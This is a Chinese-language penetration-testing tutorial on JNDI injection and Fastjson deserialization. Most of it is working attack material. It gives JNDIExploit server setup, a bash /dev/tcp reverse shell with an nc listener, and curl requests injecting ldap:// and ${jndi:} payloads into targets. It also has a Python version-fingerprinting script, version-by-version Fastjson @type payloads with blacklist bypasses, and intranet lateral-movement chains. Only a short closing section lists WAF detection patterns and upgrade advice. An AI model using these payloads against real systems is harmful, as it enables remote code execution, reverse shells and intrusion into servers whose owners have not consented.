# Java JNDI 注入 + Fastjson 反序列化深度实战

---

## 📋 目录

1. [JNDI 注入原理](#一jndi-注入原理)
2. [JNDI 利用全流程](#二jndi-利用)
3. [绕过 JDK 高版本限制](#三绕过jdk限制)
4. [Fastjson 反序列化](#四fastjson反序列化)
5. [Fastjson 探测](#五fastjson探测)
6. [Fastjson 各版本利用](#六fastjson各版本利用)
7. [Fastjson 绕过技巧](#七fastjson绕过)
8. [Log4j / Shiro 关联利用](#八关联利用)
9. [防御与检测](#九防御检测)

---

## 一、JNDI 注入原理

### 1.1 什么是 JNDI

```
JNDI (Java Naming and Directory Interface) = Java 命名与目录接口

作用: 通过名称查找资源
  lookup("jdbc/mydb")     → 返回数据库连接
  lookup("ldap://...")    → 从 LDAP 服务器加载对象
  lookup("rmi://...")     → 从 RMI 服务器加载对象

漏洞本质:
  lookup() 的参数可以被攻击者控制
  → 指向攻击者控制的 LDAP/RMI 服务器
  → 加载远程恶意 Java 类
  → 在目标服务器上执行任意代码!
```

### 1.2 影响版本

```
Java 版本         JNDI 注入风险
───────────────  ──────────────────────
< 8u113          LDAP + RMI 均可利用
8u113 - 8u191    RMI 受限, LDAP 可用
≥ 8u191          高版本限制(需绕过)
≥ 11.0.1         trustURLCodebase=false(默认)

绕过条件(高版本):
  ✦ 目标 ClassPath 中有可利用的类
  ✦ 利用本地 Gadget Chain
  ✦ 结合其他漏洞(如 Fastjson)
```

---

## 二、JNDI 利用

### 2.1 搭建 JNDI 利用服务器

```bash
# 安装 JNDIExploit
git clone https://github.com/zzwlpx/JNDIExploit
cd JNDIExploit
# 编译: mvn clean package -DskipTests

# 启动利用服务器
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389

# 服务端启动后监听:
# LDAP: attacker.com:1389
# HTTP: attacker.com:8080 (用于分发恶意Class文件)
```

### 2.2 完整利用链

```bash
# ===== Step 1: 启动攻击服务器 =====
# 攻击机:
java -jar JNDIExploit.jar -i 10.0.0.10 -p 1389
nc -lvnp 4444  # 接收反弹Shell

# ===== Step 2: 构造 Payload =====
# 反弹Shell命令(Base64编码):
echo "bash -c 'bash -i >& /dev/tcp/10.0.0.10/4444 0>&1'" | base64
# → YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC...

# JNDI URL:
ldap://10.0.0.10:1389/Basic/ReverseShell/10.0.0.10/4444

# ===== Step 3: 发送攻击请求 =====
curl 'https://target.com/vuln?name=ldap://10.0.0.10:1389/Basic/ReverseShell/10.0.0.10/4444'

# 或者通过 HTTP Header:
curl 'https://target.com/' -H 'User-Agent: ${jndi:ldap://10.0.0.10:1389/Exploit}'

# ===== Step 4: 接收 Shell =====
# nc -lvnp 4444
# → Connection received
# → id → uid=1001(tomcat)
```

### 2.3 JNDIExploit 支持的利用方式

```
支持的路径模式:

/Basic/Command/Base64/<base64_command>
  执行任意命令(Base64编码)
  例: ldap://ip:1389/Basic/Command/Base64/d2hvYW1p

/Basic/ReverseShell/<ip>/<port>
  反弹Shell(Linux)
  例: ldap://ip:1389/Basic/ReverseShell/10.0.0.10/4444

/Basic/ReverseShell/<ip>/<port>/PowerShell
  反弹Shell(Windows PowerShell)

/TomcatBypass/Command/Base64/<cmd>
  Tomcat环境下绕过限制

/TomcatBypass/ReverseShell/<ip>/<port>
  Tomcat环境反弹Shell

/Deserialize/<gadget_type>/<cmd>
  利用本地反序列化链
```

---

## 三、绕过 JDK 限制

### 3.1 高版本 JDK 绕过

```java
// Java 8u191+ 默认 trustURLCodebase = false
// → 无法加载远程类文件 → 需要绕过

// 方法1: 利用本地 Gadget Chain
// 如果目标 ClassPath 中有:
// - CommonsCollections
// - Spring Beans
// - Tomcat 相关类

// JNDI URL:
ldap://ip:1389/Deserialize/CommonsCollections6/Base64/<cmd>

// 方法2: 通过序列化工厂
// ldap://ip:1389/Deserialize/URLDNS/xxx.dnslog.cn

// 方法3: 利用 Tomcat ELProcessor
// (如果目标是 Tomcat)
new InitialContext().lookup(
  "ldap://ip:1389/TomcatBypass/Command/Base64/<cmd>"
);
```

### 3.2 绕过限制的实际案例

```bash
# 案例: Spring Boot + Tomcat (JDK 11)

# 测试是否有 JNDI:
curl -H 'X-Api-Version: ldap://attacker.com:1389/test' https://target.com

# 如果没连接 → JDK 版本限制 → 改用本地链:
curl -H 'X-Api-Version: ldap://attacker.com:1389/Deserialize/CommonsCollections6/b3Jn...'

# 如果 CommonsCollections 不可用 → 尝试 URLDNS:
curl -H 'X-Api-Version: ldap://attacker.com:1389/Deserialize/URLDNS/xxx.dnslog.cn'
# → DNSLog 收到请求 → 确认可利用(但需要找可用的Gadget)
```

---

## 四、Fastjson 反序列化

### 4.1 Fastjson 漏洞原理

```java
// Fastjson 的 @type 自动类型解析

// 正常使用:
User user = JSON.parseObject('{"name":"admin","age":18}', User.class);

// 漏洞利用 → 用户可控制 @type:
String json = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil/Exploit","autoCommit":true}';
Object obj = JSON.parse(json);
// → Fastjson 自动实例化 JdbcRowSetImpl
// → 调用 setDataSourceName() → 设置 JNDI URL
// → 调用 setAutoCommit(true) → 触发 lookup("ldap://evil/Exploit")
// → JNDI 注入 → RCE!
```

### 4.2 影响版本

```
Fastjson 版本          状态
───────────────────  ────────────
< 1.2.24             无任何防护(最危险)
1.2.25 - 1.2.41     黑名单绕过
1.2.42 - 1.2.47     checkAutoType限制
1.2.48 - 1.2.68     多层绕过
1.2.69 - 1.2.80     需开启autoType
≥ 1.2.80             safeMode(默认安全)
```

---

## 五、Fastjson 探测

### 5.1 确认 Fastjson 存在

```bash
# ===== 方法1: DNSLog 探测 =====
# 发送 JSON:
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.InetSocketAddress":{"address":"xxx.dnslog.cn","port":80}}
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}

# → 到 dnslog.cn 查看是否收到 DNS 请求
# → 收到 → 确认 Fastjson + @type 可用!

# ===== 方法2: 报错探测 =====
# 正常请求: {"name":"test"} → 正常返回
# 探测请求: {"@type":"java.lang.AutoCloseable","@type":"java.lang.Object"}
# → 如果返回 "autoType is not support" → 确认 Fastjson!

# ===== 方法3: 时间探测 =====
{"x":{"@type":"java.lang.Thread","y":{"@type":"java.lang.Thread","sleep":5000}}}
# → 如果响应延迟5秒 → 确认!

# ===== 方法4: curl 特征 =====
curl -s https://target.com/api -H 'Content-Type: application/json' \
  -d '{"a":1}' | head -20
# 如果返回 JSON 且格式规整 → 可能使用了 Fastjson/Jackson
```

### 5.2 确认版本

```python
#!/usr/bin/env python3
"""Fastjson 版本探测"""
import requests
import json

TARGET = "https://target.com/api"

# 已知各版本的报错特征
payloads = [
    # 1.2.24 及以下 → 无限制
    ('{"@type":"com.sun.rowset.JdbcRowSetImpl"}', "1.2.24-"),
    # 1.2.25-1.2.41 → 检查黑名单
    ('{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;"}', "1.2.25-1.2.41"),
    # 1.2.42+ → 双写绕过
    ('{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;"}', "1.2.42+"),
]

headers = {"Content-Type": "application/json"}
for payload, version_range in payloads:
    try:
        r = requests.post(TARGET, data=payload, headers=headers, timeout=5)
        error = r.text[:200]
        if "autoType is not support" in error:
            print(f"[+] 版本范围: {version_range} (有 autoType 限制)")
        elif "JdbcRowSetImpl" in error:
            print(f"[+] 版本范围: {version_range} (类在黑名单中)")
        elif r.status_code == 200:
            print(f"[!] 版本范围: {version_range} (可能未拦截!)")
    except Exception as e:
        print(f"[-] {payload[:40]}... Error: {e}")
```

---

## 六、Fastjson 各版本利用

### 6.1 Fastjson ≤ 1.2.24

```bash
# 无任何防护，直接利用
# Payload:
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}

# 或使用 TemplatesImpl (无需出网):
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["<Base64编码的恶意Class>"],
  "_name": "a",
  "_tfactory": {},
  "_outputProperties": {}
}
```

### 6.2 Fastjson 1.2.25-1.2.41

```bash
# 黑名单已启用 → 需要绕过
# 利用 L + ; 绕过:

{
  "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
# → Fastjson 处理后去掉 L 前缀和 ; 后缀 → 还原类名
```

### 6.3 Fastjson 1.2.42-1.2.45

```bash
# 双写 LL + ;; 绕过:

{
  "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

### 6.4 Fastjson 1.2.47（通用利用链）

```bash
# CVE-2021-xxxx — 利用缓存机制绕过

# Step 1: 将恶意类写入缓存
{
  "x": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  }
}

# Step 2: 从缓存加载(绕过 checkAutoType)
{
  "y": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
}
```

### 6.5 Fastjson 1.2.68-1.2.80

```bash
# 需要开启 autoType(默认关闭)
# ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

# 或利用期望类(ExpectClass)特性:
{
  "@type": "org.apache.shiro.jndi.JndiObjectFactory",
  "resourceName": "ldap://attacker.com:1389/Exploit"
}
# 前提: ClassPath 中有 Shiro

# 或利用:
{
  "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
  "properties": {
    "data_source": "ldap://attacker.com:1389/Exploit"
  }
}
# 前提: ClassPath 中有 MyBatis
```

---

## 七、Fastjson 绕过

```json
// 1. Unicode 编码绕过
{"\u0040\u0074\u0079\u0070\u0065":"java.net.Inet4Address","val":"xxx"}
// → @type 的每个字符用 Unicode 表示

// 2. 16进制/8进制 ascii
"\x40\x74\x79\x70\x65"

// 3. 嵌套类绕过
{
  "x": {
    "@type": "java.util.HashMap",
    "y.z": {
      "@type": "com.sun.rowset.JdbcRowSetImpl",
      "dataSourceName": "ldap://evil.com/Exploit",
      "autoCommit": true
    }
  }
}

// 4. 利用 json 注释(某些版本)
{"@type":"com.sun.rowset.JdbcRowSetImpl"/*comment*/,...}

// 5. 使用 $$ 替换 @
{"$$type":"com.sun.rowset.JdbcRowSetImpl",...}
```

---

## 八、关联利用

### 8.1 Log4Shell → Fastjson

```
Log4Shell 发现 → 获取内网权限 → 发现内网Fastjson服务
→ 利用Fastjson进一步横向移动

实际链:
  Log4j RCE → 反弹Shell → 
  内网扫描 → 发现 10.0.2.50:8080(Fastjson API) →
  Fastjson exploit → 数据库服务器权限
```

### 8.2 Shiro → Fastjson

```
Shiro RememberMe RCE → 进入内网 →
Fastjson API无认证 → Fastjson RCE → 扩大权限
```

---

## 九、防御检测

### 检测

```yaml
# WAF规则 — Fastjson攻击检测
rules:
  - name: fastjson_jndi
    pattern: 'JdbcRowSetImpl|JndiObjectFactory|JndiDataSourceFactory|TemplatesImpl'
  - name: fastjson_autotype  
    pattern: '"@type"|"$$type"|\\u0040\\u0074\\u0079\\u0070\\u0065'
  - name: jndi_ldap
    pattern: 'ldap://|rmi://|jndi:'
```

### 防御

```java
// 1. 升级 Fastjson(推荐)
// ≥ 1.2.83 并开启 safeMode:
ParserConfig.getGlobalInstance().setSafeMode(true);

// 2. 使用 Jackson/Gson(替代方案)
// Jackson: 默认不解析 @type
// Gson: 不解析 @type

// 3. WAF 规则
// 拦截请求中包含 JdbcRowSetImpl 等黑名单类名

// 4. JDK 升级
// ≥ 8u191, ≥ 11.0.1 → trustURLCodebase=false
```

---

## ✅ Checklist

**JNDI**
- [ ] 确认 lookup() 参数可控
- [ ] 搭建 JNDIExploit 服务器
- [ ] DNSLog 确认出网
- [ ] 反弹 Shell
- [ ] 高版本 JDK 绕过

**Fastjson**
- [ ] DNSLog / 报错探测确认
- [ ] 版本判断
- [ ] 选择对应版本 Payload
- [ ] Unicode/嵌套绕过
- [ ] 结合本地 Gadget Chain
